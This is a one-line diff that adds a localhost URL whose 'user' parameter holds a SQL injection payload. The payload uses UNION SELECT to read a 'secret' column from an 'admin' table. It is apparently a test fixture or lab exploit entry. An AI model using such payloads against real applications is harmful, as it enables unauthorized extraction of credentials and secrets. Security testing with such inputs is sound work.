@@ -1,0 +1,1 @@
+http://localhost:8080/index.php?user=' UNION SELECT 1, secret, 1 FROM admin-- -
